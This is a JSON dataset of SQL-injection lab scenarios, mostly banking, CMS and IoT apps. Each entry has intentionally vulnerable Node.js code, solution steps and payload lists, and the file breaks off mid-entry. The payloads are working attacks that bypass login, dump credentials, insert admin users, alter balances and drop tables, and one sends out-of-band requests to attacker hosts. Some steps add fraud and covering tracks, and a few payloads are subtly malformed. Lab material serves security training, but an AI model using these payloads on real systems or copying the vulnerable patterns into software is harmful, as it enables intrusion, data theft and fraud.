[
  {
    "Lab scenario": "Banking Web Interface - SQL Injection via ORDER BY in Transaction History",
    "Lab Description": "The transaction history page uses a dynamic 'sort_by' parameter in the ORDER BY clause without proper validation. This allows attackers to manipulate the clause to trigger SQL errors or extract hidden fields. To solve: exploit ORDER BY injection to leak hidden transaction metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to intercept the request and tamper the 'sort_by' parameter.",
      "Inject numeric and column name values to test sorting behavior.",
      "Inject 'ORDER BY 100--' to trigger database error leakage.",
      "Use 'ORDER BY CASE WHEN (SELECT ...)' to extract field values.",
      "Enumerate column names from information_schema using crafted ORDER logic."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const { sort_by } = req.query;\n  const query = `SELECT * FROM transactions ORDER BY ${sort_by}`;\n  db.query(query, (err, result) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(result);\n  });\n});",
    "payloads": [
      "amount DESC;--",
      "1;SELECT NULL FROM users--",
      "CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN amount ELSE date END"
    ]
  },
  {
    "Lab scenario": "Mobile Banking API - SQL Injection via JSON Body in Login Endpoint",
    "Lab Description": "The login API parses JSON request bodies without sanitizing the 'username' field before embedding into a SQL query. Attackers can exploit this vector to perform JSON-based SQL Injection. To solve: bypass authentication and extract user roles.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send crafted JSON payloads to '/api/login'.",
      "Inject SQL payloads in 'username' JSON key to bypass auth.",
      "Use 'OR 1=1--' style payloads to login without credentials.",
      "Chain injection with UNION SELECT to enumerate roles.",
      "Access admin portal with escalated privileges."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/api/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.query(query, (err, result) => {\n    if (result.length > 0) res.send('Welcome');\n    else res.status(401).send('Invalid credentials');\n  });\n});",
    "payloads": [
      "{ \"username\": \"' OR 1=1--\", \"password\": \"abc\" }",
      "{ \"username\": \"' UNION SELECT null, 'admin', 'admin' --\", \"password\": \"\" }"
    ]
  },
  {
    "Lab scenario": "Banking CMS Panel - Time-Based SQL Injection in User Profile Edit",
    "Lab Description": "The edit profile form allows updates via a 'user_id' parameter vulnerable to time-based SQL Injection. Attackers can extract admin credentials by observing response delays. To solve: exploit timing side channels to exfiltrate password hashes.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Intruder with a delay payload in 'user_id'.",
      "Inject 'SLEEP(5)' or 'pg_sleep(5)' payloads.",
      "Infer character-by-character admin password by time delay.",
      "Automate with sqlmap using '--technique=T'.",
      "Log into admin portal using recovered password hash."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/edit-profile', (req, res) => {\n  const { user_id, email } = req.body;\n  db.query(`UPDATE users SET email='${email}' WHERE id='${user_id}'`, (err) => {\n    if (err) res.status(500).send('Update failed');\n    else res.send('Updated');\n  });\n});",
    "payloads": [
      "1' OR IF(1=1, SLEEP(5), 0)--",
      "1'; WAITFOR DELAY '00:00:05'--"
    ]
  },
  {
    "Lab scenario": "Bank Staff API - SQL Injection in XML-Based Login Service",
    "Lab Description": "The legacy SOAP-based login API parses XML and injects values directly into SQL without validation. This leads to SQL Injection via XML elements. To solve: extract the database version and active session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use SOAP UI or Postman to craft XML login requests.",
      "Inject SQL payloads into <username> XML tag.",
      "Leak SQL error messages to infer database behavior.",
      "Use UNION SELECT to dump session tokens.",
      "Replay session tokens to hijack authenticated sessions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/staff-login', (req, res) => {\n  xmlParser(req.body, (err, result) => {\n    const { username, password } = result.credentials;\n    const query = `SELECT * FROM staff WHERE user = '${username}' AND pass = '${password}'`;\n    db.query(query, (err, user) => {\n      if (user) res.send('Logged in');\n      else res.status(401).send('Invalid');\n    });\n  });\n});",
    "payloads": [
      "<username>' OR 1=1--</username>",
      "<username>' UNION SELECT version(), null--</username>"
    ]
  },
  {
    "Lab scenario": "Bank Admin Scheduler - GROUP BY SQL Injection in Event Aggregation",
    "Lab Description": "Admin reports group events by user and device type using unfiltered user input. Improper use of GROUP BY enables SQL Injection leading to privilege escalation. To solve: inject payloads into GROUP BY clause to access hidden audit logs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the report request with Burp.",
      "Inject fake column names in GROUP BY via manipulated inputs.",
      "Trigger SQL errors with incorrect GROUP logic.",
      "Use CASE WHEN expressions to extract additional rows.",
      "Enumerate other admin actions logged in audit tables."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/admin/reports', (req, res) => {\n  const { group_field } = req.query;\n  db.query(`SELECT ${group_field}, COUNT(*) FROM logs GROUP BY ${group_field}`,(err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "device_type, (SELECT password FROM admins LIMIT 1)--",
      "user_id, CASE WHEN (1=1) THEN NULL ELSE NULL END"
    ]
  },
  {
    "Lab scenario": "Banking Dashboard - Stacked SQL Injection via Currency Conversion Widget",
    "Lab Description": "The currency converter widget takes an amount and a target currency via query params. Due to improper input sanitation, attackers can inject stacked SQL queries to modify exchange rate tables. To solve: override USD conversion rates to gain financial advantage.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept widget request with '?currency=' parameter.",
      "Inject stacked queries using ';' to alter database state.",
      "Update exchange rates to attacker-controlled values.",
      "Force a large USD->BTC transfer using inflated rate.",
      "Revert changes to avoid detection."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/convert', (req, res) => {\n  const { currency } = req.query;\n  db.query(`SELECT rate FROM exchange WHERE currency = '${currency}'`, (err, rate) => {\n    if (err) res.status(500).send('Error');\n    else res.send('Rate: ' + rate);\n  });\n});",
    "payloads": [
      "USD'; UPDATE exchange SET rate=1000 WHERE currency='USD'--",
      "BTC'; INSERT INTO logs (action) VALUES ('rate hijack')--"
    ]
  },
  {
    "Lab scenario": "Banking Reward API - UNION SQL Injection in Points Redeem System",
    "Lab Description": "The points redeem system accepts a 'voucher_id' input which is injectable via UNION statements. Exploiting this reveals customer reward balances and account mappings. To solve: dump reward history of top users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Fuzz 'voucher_id' with UNION-based payloads via Burp.",
      "Match column count by trial and error.",
      "Dump reward history using crafted SELECT statements.",
      "Retrieve user mappings with UNION SELECT.",
      "Submit voucher code to simulate reward redemption."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/rewards/redeem', (req, res) => {\n  const { voucher_id } = req.query;\n  db.query(`SELECT * FROM rewards WHERE voucher = '${voucher_id}'`, (err, data) => {\n    if (err) res.status(500).send('Invalid');\n    else res.send('Success');\n  });\n});",
    "payloads": [
      "' UNION SELECT id, name, points FROM users --",
      "' UNION ALL SELECT null, 'admin', 99999 --"
    ]
  },
  {
    "Lab scenario": "Bank Internal File Access - SQL Injection via Filename Search",
    "Lab Description": "The file search system queries the 'documents' table based on unvalidated 'filename' input. SQL Injection allows attackers to extract file contents and system paths. To solve: retrieve internal configuration files via SQL payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept search query to /file/search?filename=...",
      "Inject OR 1=1-- style payloads to list all filenames.",
      "Use UNION SELECT to read sensitive config entries.",
      "Dump contents of internal logs or env vars.",
      "Export results to exfiltrate server-side file data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/file/search', (req, res) => {\n  const { filename } = req.query;\n  db.query(`SELECT * FROM documents WHERE filename LIKE '%${filename}%'`, (err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "%' OR 1=1 --",
      "%' UNION SELECT null, LOAD_FILE('/etc/passwd') --"
    ]
  },
  {
    "Lab scenario": "Banking Email Export Tool - Boolean SQL Injection in Filter Expression",
    "Lab Description": "Email export filters use an injectable expression that gets appended to a WHERE clause. Attackers can use Boolean logic to infer email content and attachments. To solve: extract sensitive PDF reports by exploiting Boolean logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept export request and locate 'filter' parameter.",
      "Use AND 1=1/AND 1=2 payloads to determine logic handling.",
      "Craft Boolean expressions to reveal email content.",
      "Use substr + ascii to extract subject line char-by-char.",
      "Compile leaked email list and decode attachments."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/export-emails', (req, res) => {\n  const { filter } = req.query;\n  db.query(`SELECT * FROM emails WHERE ${filter}`, (err, emails) => {\n    if (err) res.status(500).send('Export failed');\n    else res.json(emails);\n  });\n});",
    "payloads": [
      "1=1 --",
      "1=0 OR ascii(substr(subject,1,1))=65 --"
    ]
  },
  {
    "Lab scenario": "Banking portal stacked SQL injection in search query logging",
    "Lab Description": "The backend logs every user search to a database without sanitizing input. The application fails to restrict multiple SQL statements in one request, allowing attackers to perform stacked queries. To solve: Inject a payload that adds a new admin user to the database via stacked query execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept search request using Burp Suite",
      "Send payload with a semicolon to test stacked query support",
      "Craft injection to insert an admin user: '; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin'); --",
      "Observe server behavior or error logs confirming injection success",
      "Login with the new admin credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q;\n  const logQuery = `INSERT INTO search_logs (term) VALUES ('${term}')`;\n  db.query(logQuery, (err) => {\n    if (err) console.log('DB Error:', err);\n    res.send('Search term logged.');\n  });\n});",
    "payloads": [
      "'; INSERT INTO users (username, password, role) VALUES ('admin2','admin123','admin'); --",
      "'; DROP TABLE transactions; --",
      "'; UPDATE accounts SET balance=100000 WHERE user='attacker'; --"
    ]
  },
  {
    "Lab scenario": "API gateway Boolean-based SQL injection in filter parameter",
    "Lab Description": "An API accepts filter parameters for sorting transaction data. The SQL query does not properly escape the 'filter' parameter, enabling Boolean-based SQL injection. To solve: Extract the database version using a true/false inference technique.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request with different 'filter' values",
      "Test payload: ' OR 1=1 -- to confirm vulnerability",
      "Use time delay logic like ' OR 1=1 AND SLEEP(5) -- to infer",
      "Craft a binary search loop using sqlmap with --technique=B",
      "Extract version string from system tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/transactions', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM transactions WHERE status='${filter}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND SUBSTRING(@@version,1,1)='5' --",
      "' AND ASCII(SUBSTRING((SELECT version()),1,1))=52 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION SQL injection in device filter",
    "Lab Description": "The IoT dashboard uses a vulnerable SQL statement to filter devices based on type. The 'deviceType' parameter is not sanitized, allowing attackers to inject a UNION query. To solve: Leak admin credentials from the 'users' table via UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to spider device filter endpoints",
      "Identify vulnerable parameter with UNION ... NULL test",
      "Determine number of columns using ORDER BY and UNION NULL technique",
      "Craft UNION SELECT payload to retrieve username and password",
      "Capture credentials from server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices', (req, res) => {\n  const type = req.query.deviceType;\n  const query = `SELECT id, name FROM devices WHERE type='${type}'`;\n  db.query(query, (err, results) => {\n    if (err) console.log(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' UNION SELECT null, version() --",
      "' UNION SELECT 1, group_concat(email) FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS comment section out-of-band SQL injection in author metadata",
    "Lab Description": "The CMS stores commenter metadata and inserts the author value into the database without escaping. The backend firewall suppresses error messages, making exploitation detectable only via out-of-band channels. To solve: Trigger an OOB DNS request via injected SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit comment with controlled 'author' field using Burp Suite",
      "Inject payload using MSSQL's xp_dirtree or MySQL's LOAD_FILE",
      "Monitor Burp Collaborator or DNS logs for exfiltrated subdomain",
      "Confirm server made DNS/HTTP request to external domain",
      "Use injection to extract more data or confirm DB backend"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { comment, author } = req.body;\n  const insert = `INSERT INTO comments (text, author) VALUES ('${comment}', '${author}')`;\n  db.query(insert, (err) => {\n    if (err) console.error('Insert failed:', err);\n    res.send('Comment submitted');\n  });\n});",
    "payloads": [
      "'; exec master..xp_dirtree '//attacker.collab.com/test' --",
      "'; SELECT LOAD_FILE('\\\\attacker.com\\test') --",
      "'; SELECT pg_read_file('/etc/passwd') --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account filtering with GROUP BY",
    "Lab Description": "The backend forms a SQL query grouping accounts by status. It allows raw injection into the GROUP BY clause via user-supplied filters. To solve: Exploit the GROUP BY to inject HAVING clauses and trigger data leakage.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to analyze GET /accounts?groupBy=status",
      "Inject HAVING 1=1 -- to observe impact",
      "Craft payloads using GROUP BY ... HAVING to filter conditional rows",
      "Use UNION or SELECT inside HAVING to leak data",
      "Confirm sensitive fields in response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/accounts', (req, res) => {\n  const group = req.query.groupBy;\n  const query = `SELECT COUNT(*), ${group} FROM accounts GROUP BY ${group}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(500).send('Error');\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "status HAVING 1=1 --",
      "status HAVING (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' --",
      "status HAVING LENGTH((SELECT password FROM users LIMIT 1))>5 --"
    ]
  },
  {
    "Lab scenario": "Banking API SQL injection in nested JSON field",
    "Lab Description": "The API processes nested JSON payloads and uses the 'account.id' field in a query without sanitization. This allows injection inside JSON bodies. To solve: Inject a payload to retrieve internal configuration data using a UNION SELECT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft JSON body and intercept with Burp Suite",
      "Inject SQL into account.id: \"' UNION SELECT config_value, NULL FROM settings --\"",
      "Use Postman to send requests and analyze API response",
      "Check returned values for leakage from 'settings' table",
      "Confirm internal keys or configurations were exposed"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/transfer', (req, res) => {\n  const id = req.body.account.id;\n  const q = `SELECT balance FROM accounts WHERE id='${id}'`;\n  db.query(q, (err, result) => {\n    if (err) res.status(500).send('Error');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT config_value, NULL FROM settings --",
      "' OR 1=1 --",
      "' AND SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in ORDER BY parameter on blog list",
    "Lab Description": "The blog list uses dynamic ORDER BY values from user input. There is no input whitelist or escaping, allowing injection into the SQL ORDER BY clause. To solve: Leak usernames using error-based payloads via ordering expressions.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /blogs?sortBy=date via browser",
      "Test payload: sortBy=1;SELECT version() --",
      "Inject ORDER BY CASE statements to cause errors or leak data",
      "Observe error leakage in verbose logging",
      "Confirm exposed usernames or version"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/blogs', (req, res) => {\n  const sort = req.query.sortBy;\n  const query = `SELECT * FROM blogs ORDER BY ${sort}`;\n  db.query(query, (err, rows) => {\n    if (err) res.status(500).send(err.message);\n    else res.json(rows);\n  });\n});",
    "payloads": [
      "title;SELECT version() --",
      "CASE WHEN (1=1) THEN title ELSE date END",
      "1;SELECT username FROM users LIMIT 1 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard time-based SQL injection in settings update",
    "Lab Description": "The dashboard stores device settings submitted via a POST form. The device ID is vulnerable to SQL injection with no error output. To solve: Use time-based payloads to extract the first character of the admin's password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST with device ID field using OWASP ZAP",
      "Inject time-based payload: ' OR IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --",
      "Observe response time to infer correct character",
      "Automate binary search with sqlmap and --technique=T",
      "Extract full password"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/device/settings', (req, res) => {\n  const id = req.body.deviceId;\n  const update = `UPDATE devices SET mode='auto' WHERE id='${id}'`;\n  db.query(update, (err) => {\n    if (err) console.error(err);\n    res.send('Updated');\n  });\n});",
    "payloads": [
      "' OR IF(SUBSTRING((SELECT password FROM users WHERE role='admin'),1,1)='a', SLEEP(5), 0) --",
      "' AND SLEEP(3) --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION SQL injection in account balance query",
    "Lab Description": "The banking portal allows users to view their balance by submitting an account number via URL parameters. However, the account number input is directly inserted into an SQL query without proper sanitization, enabling a UNION-based SQL injection attack. To solve: Use UNION to retrieve additional data from the users table and exploit this vulnerability to extract usernames and email addresses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request with Burp Suite and observe the account parameter",
      "Test for UNION support by injecting ' UNION SELECT NULL --'",
      "Craft a UNION-based injection to retrieve usernames and emails from the 'users' table",
      "Use sqlmap to automate the extraction of sensitive data",
      "Verify the data by logging in with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account', (req, res) => {\n  const account = req.query.account;\n  const query = `SELECT balance FROM accounts WHERE account_number = '${account}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' UNION SELECT NULL, version() --",
      "' UNION SELECT 1, group_concat(username) FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS POST-based SQL injection in user registration form",
    "Lab Description": "A Content Management System (CMS) registration form allows users to create accounts by submitting their details. The backend SQL query used to insert these details does not sanitize input, allowing SQL injection attacks through form fields. To solve: Inject malicious SQL to create a new admin user in the system’s database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Monitor form submission using Burp Suite",
      "Test for injection by submitting a payload in the 'username' field",
      "Craft an SQL payload to insert a new admin account: ' OR 1=1; INSERT INTO users (username, password, role) VALUES ('attacker', 'password', 'admin'); --'",
      "Use sqlmap to automate the attack and verify user creation",
      "Log in with the newly created admin credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const { username, password } = req.body;\n  const query = `INSERT INTO users (username, password) VALUES ('${username}', '${password}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('User created');\n  });\n});",
    "payloads": [
      "' OR 1=1; INSERT INTO users (username, password, role) VALUES ('attacker', 'password', 'admin'); --",
      "'; DROP TABLE users; --",
      "'; UPDATE users SET role='admin' WHERE username='attacker'; --"
    ]
  },
  {
    "Lab scenario": "IoT device dashboard Blind SQL injection in device ID input",
    "Lab Description": "The IoT device dashboard accepts a device ID in the URL to fetch device status. The input is not sanitized, leading to a blind SQL injection vulnerability. To solve: Use boolean-based blind SQL injection to infer device status or other sensitive information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept and analyze the device ID parameter with Burp Suite",
      "Test the parameter for blind injection by injecting ' OR 1=1 -- and checking for server response changes",
      "Craft a boolean-based payload to infer the existence of a specific device or admin",
      "Automate the exploitation using sqlmap with --technique=B",
      "Verify the status or device details from the response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/status', (req, res) => {\n  const id = req.query.deviceId;\n  const query = `SELECT status FROM devices WHERE device_id = '${id}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' AND (SELECT COUNT(*) FROM devices) > 0 --",
      "' AND (SELECT SUBSTRING(status, 1, 1) FROM devices WHERE device_id = 1) = 'a' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in POST parameter (nested JSON)",
    "Lab Description": "The API accepts a nested JSON payload to update device configurations. The 'deviceId' in the JSON is vulnerable to SQL injection. To solve: Craft a nested SQL injection payload to retrieve data from other tables in the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a POST request using Postman with a nested JSON body containing the 'deviceId' field",
      "Inject SQL code into the 'deviceId' field: ' OR 1=1 --",
      "Use Burp Suite to analyze server responses and determine the number of columns",
      "Automate SQL query extraction with sqlmap and --technique=U for UNION queries",
      "Extract sensitive data like admin credentials or configuration details"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/device/update', (req, res) => {\n  const deviceId = req.body.device.id;\n  const query = `UPDATE devices SET status='active' WHERE device_id='${deviceId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; UNION SELECT null, version() --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS user profile SQL injection in username parameter",
    "Lab Description": "A CMS allows users to update their profiles. The 'username' field in the form is vulnerable to SQL injection, leading to potential data leakage. To solve: Inject SQL to retrieve other users’ usernames and email addresses from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the user profile update request",
      "Inject SQL payload into the username field to test for injection: ' OR 1=1 --",
      "Use UNION SELECT to retrieve other users' data from the 'users' table",
      "Automate with sqlmap to extract usernames and emails",
      "Verify by updating profile with new malicious data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/profile/update', (req, res) => {\n  const { username, email } = req.body;\n  const query = `UPDATE users SET email='${email}' WHERE username='${username}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT password FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in query parameter (username)",
    "Lab Description": "The API gateway accepts a query parameter for user authentication based on the username. This parameter is not sanitized properly, leading to a SQL injection vulnerability. To solve: Use a UNION-based SQL injection to extract data from the users table and retrieve the admin credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request with the username query parameter",
      "Test for injection by adding ' UNION SELECT NULL, username, password FROM users --'",
      "Use sqlmap to automate the UNION injection and retrieve admin credentials",
      "Verify the extracted credentials by using them to log into the application",
      "Cleanup: Remove session data and obfuscate the attack trace"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/authenticate', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT id, password FROM users WHERE username = '${username}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, password FROM users --",
      "' UNION SELECT 1, version() --",
      "'; DROP TABLE users --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Time-based Blind SQL injection in device name",
    "Lab Description": "The IoT dashboard allows querying of device names through a vulnerable search API. The input is not sanitized, allowing for time-based blind SQL injection. To solve: Use time-based SQL injection to infer device information from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the request using Burp Suite and locate the device name parameter",
      "Inject a payload like ' OR IF(1=1, SLEEP(5), 0) -- to test for time-based response",
      "Craft time-based payloads to infer the existence of devices or usernames",
      "Use sqlmap with --technique=T for time-based exploitation",
      "Verify device information by analyzing the delay in responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/search', (req, res) => {\n  const deviceName = req.query.name;\n  const query = `SELECT name FROM devices WHERE name = '${deviceName}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0) --",
      "' OR IF(1=2, SLEEP(5), 0) --",
      "' AND SLEEP(5) --"
    ]
  },
  {
    "Lab scenario": "Banking portal ORDER BY SQL injection in transaction history",
    "Lab Description": "The banking portal allows users to view transaction histories through the 'order by' query parameter. However, the query does not sanitize the input, allowing an attacker to manipulate the query and gain unauthorized access to sensitive data. To solve: Use an ORDER BY-based SQL injection to enumerate columns and extract data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and observe the 'order by' parameter",
      "Inject ' ORDER BY 1--' to test for error-based feedback",
      "Enumerate the column numbers by incrementing the 'order by' value until the application crashes",
      "Craft a UNION-based payload to extract transaction history and account details",
      "Use sqlmap to automate the enumeration process and retrieve sensitive data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const order = req.query.orderBy;\n  const query = `SELECT id, date, amount FROM transactions ORDER BY ${order}`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1 --",
      "' ORDER BY 2 --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS product filter SQL injection in product ID",
    "Lab Description": "The CMS allows users to filter products by ID, but the input is not sanitized. This creates an opportunity for SQL injection. To solve: Inject SQL payloads into the product ID filter to enumerate other products and extract their details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the product ID parameter",
      "Test for SQL injection by injecting ' OR 1=1 --",
      "Use UNION SELECT to retrieve product information from the 'products' table",
      "Use sqlmap to automate the attack and confirm the data extraction",
      "Verify the product data by analyzing the server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, price FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT id, name, price FROM products --",
      "'; SELECT password FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "IoT device control SQL injection in device control endpoint",
    "Lab Description": "The IoT device control endpoint accepts device ID input via query parameters, which is directly inserted into an SQL query without sanitization. To solve: Exploit this vulnerability using a UNION SQL injection to access sensitive data, such as device configuration and user information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request using Burp Suite and observe the device ID parameter",
      "Inject ' UNION SELECT NULL, device_id, device_status FROM devices --' to test the SQL injection",
      "Enumerate columns and gather sensitive device information",
      "Use sqlmap to automate the exploitation and retrieve admin-level device data",
      "Use the extracted data to modify device configurations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/control', (req, res) => {\n  const deviceId = req.query.deviceId;\n  const query = `SELECT id, status FROM devices WHERE id = '${deviceId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, device_id, device_status FROM devices --",
      "'; UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in user search API",
    "Lab Description": "The API gateway allows admins to search for users by their username. The 'username' field is vulnerable to SQL injection, which can be exploited to extract data. To solve: Use a UNION-based SQL injection to retrieve sensitive user data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search request with a crafted 'username' parameter",
      "Test the injection using ' UNION SELECT username, email FROM users --'",
      "Use sqlmap to automate the UNION attack and extract usernames and emails",
      "Verify the extraction by analyzing the returned user data",
      "Obfuscate the attack and clear traces"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/search', (req, res) => {\n  const username = req.query.username;\n  const query = `SELECT id, email FROM users WHERE username = '${username}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "'; SELECT password FROM users WHERE username='admin' --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking portal HAVING SQL injection in transaction query",
    "Lab Description": "The banking portal uses a HAVING clause to filter transactions by status. The application does not sanitize input, allowing an attacker to inject malicious SQL. To solve: Use a HAVING clause-based SQL injection to enumerate columns and extract sensitive transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and examine the 'status' parameter",
      "Test for HAVING clause injection using ' HAVING 1=1 --'",
      "Enumerate columns with ' HAVING 1=2 --' and adjust until the correct number of columns is found",
      "Craft a UNION-based SQL payload to extract transaction data",
      "Automate extraction with sqlmap and verify the returned results"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const status = req.query.status;\n  const query = `SELECT id, amount FROM transactions HAVING status = '${status}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' HAVING 1=1 --",
      "' HAVING 1=2 --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS file upload SQL injection in file name parameter",
    "Lab Description": "The CMS allows users to upload profile images, but it is vulnerable to SQL injection in the 'fileName' parameter. An attacker can inject SQL into the file name, which is used in a database query. To solve: Exploit the SQL injection vulnerability to extract user data by manipulating the file name parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the file upload request using Burp Suite",
